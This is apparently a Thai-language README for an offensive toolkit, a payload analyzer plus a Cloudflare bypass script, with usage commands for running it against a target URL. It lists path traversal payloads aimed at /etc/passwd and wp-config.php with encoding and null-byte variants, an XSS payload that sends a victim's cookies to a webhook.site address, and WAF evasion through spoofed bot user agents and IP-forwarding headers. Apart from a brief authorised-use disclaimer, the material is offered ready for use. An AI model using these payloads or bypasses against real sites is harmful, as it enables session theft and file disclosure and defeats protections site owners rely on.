# Payload Analyzer & Cloudflare Bypass Tools

เครื่องมือวิเคราะห์และทดสอบ payload สำหรับการโจมตีแบบ Path Traversal และ XSS พร้อมเทคนิคการ bypass Cloudflare protection

## คุณสมบัติ

### Payload Analyzer (`payload_analyzer.py`)
- ทดสอบ Path Traversal payloads หลากหลายรูปแบบ
- ทดสอบ XSS payloads พร้อม cookie stealing
- เทคนิคการ bypass protection ต่างๆ
- HTTP Parameter Pollution
- บันทึกผลลัพธ์เป็น JSON

### Cloudflare Bypass (`cloudflare_bypass.py`)
- เทคนิคการ bypass Cloudflare แบบเฉพาะเจาะจง
- User-Agent rotation (Bot, Mobile, Desktop)
- IP spoofing headers
- HTTP method manipulation
- Content-Type manipulation

## การติดตั้ง

```bash
# ติดตั้ง dependencies
pip install -r requirements.txt

# หรือติดตั้งด้วย pip
pip install requests urllib3
```

## วิธีการใช้งาน

### 1. Payload Analyzer

```bash
# ทดสอบทั้งหมด
python payload_analyzer.py https://example.com

# ทดสอบเฉพาะ Path Traversal
python payload_analyzer.py https://example.com --path-traversal-only

# ทดสอบเฉพาะ XSS
python payload_analyzer.py https://example.com --xss-only

# บันทึกผลลัพธ์เป็นไฟล์
python payload_analyzer.py https://example.com -o results.json

# ตั้งค่า timeout
python payload_analyzer.py https://example.com -t 15
```

### 2. Cloudflare Bypass

```bash
# ทดสอบ bypass ด้วย payload เฉพาะ
python cloudflare_bypass.py https://example.com "../../../../../../etc/passwd"

# บันทึกผลลัพธ์
python cloudflare_bypass.py https://example.com "../../../../../../etc/passwd" -o bypass_results.json
```

## Payloads ที่รองรับ

### Path Traversal
- Basic: `../../../../../../etc/passwd`
- URL encoded: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- Double encoding: `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwp-config.php`
- Unicode bypass: `..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd`
- Null byte injection: `../../../../../../etc/passwd%00`

### XSS Payloads
- Basic: `<script>alert('XSS')</script>`
- Cookie stealing: `<script>var a='https://webhook.site/128fa6c2-fe85-4a6c-b522-0346f6aae885';document.location=a + '/?c=' + encodeURIComponent(document.cookie);</script>`
- URL encoded: `%3Cscript%3Ealert('XSS')%3C/script%3E`
- Event handlers: `' onmouseover='alert(1)`

### Bypass Techniques
- Bot User-Agents (Googlebot, Bingbot, Baiduspider)
- Mobile User-Agents
- IP spoofing headers (X-Forwarded-For, X-Real-IP, CF-Connecting-IP)
- Language headers manipulation
- HTTP method manipulation (POST, PUT)
- Content-Type manipulation (JSON, XML)

## ตัวอย่างผลลัพธ์

### การทดสอบ Path Traversal
```
[+] ทดสอบ Path Traversal payloads...
[+] Potential success: https://example.com/index.php?page=../../../../../../etc/passwd
    Status: 200, Length: 1024
```

### การ bypass Cloudflare
```
[+] ทดสอบ Cloudflare bypass สำหรับ payload: ../../../../../../etc/passwd
  [-] ทดสอบ: Google Bot
    [+] สำเร็จ! https://example.com/index.php?page=../../../../../../etc/passwd
        Status: 200, Length: 1024
```

## ข้อควรระวัง

⚠️ **คำเตือน**: เครื่องมือนี้มีวัตถุประสงค์เพื่อการทดสอบความปลอดภัยเท่านั้น

- ใช้เฉพาะกับระบบที่คุณได้รับอนุญาตให้ทดสอบ
- ไม่ใช้กับระบบที่ไม่ได้เป็นเจ้าของหรือได้รับอนุญาต
- ปฏิบัติตามกฎหมายและข้อกำหนดที่เกี่ยวข้อง
- ใช้อย่างรับผิดชอบและมีจริยธรรม

## การวิเคราะห์ผลลัพธ์

### ไฟล์ JSON Output
```json
{
  "target_url": "https://example.com",
  "timestamp": "2024-01-01 12:00:00",
  "path_traversal": [
    {
      "payload": "../../../../../../etc/passwd",
      "url": "https://example.com/index.php?page=../../../../../../etc/passwd",
      "status_code": 200,
      "response_length": 1024,
      "is_blocked": false,
      "response_preview": "root:x:0:0:root:/root:/bin/bash..."
    }
  ],
  "xss": [...],
  "bypass_techniques": [...],
  "parameter_pollution": [...]
}
```

## การแก้ไขปัญหา

### ปัญหาที่พบบ่อย

1. **Connection timeout**
   - เพิ่มค่า timeout: `-t 30`
   - ตรวจสอบการเชื่อมต่ออินเทอร์เน็ต

2. **Rate limiting**
   - เครื่องมือมี delay อัตโนมัติ
   - ลดความถี่ในการทดสอบ

3. **Cloudflare blocking**
   - ใช้ `cloudflare_bypass.py` สำหรับเทคนิคเฉพาะ
   - เปลี่ยน User-Agent และ headers

## การพัฒนาต่อ

- เพิ่มเทคนิคการ bypass ใหม่
- รองรับ proxy และ VPN
- เพิ่มการทดสอบ SQL Injection
- รองรับการทดสอบแบบ concurrent

## License

MIT License - ใช้สำหรับการศึกษาและการทดสอบความปลอดภัยเท่านั้น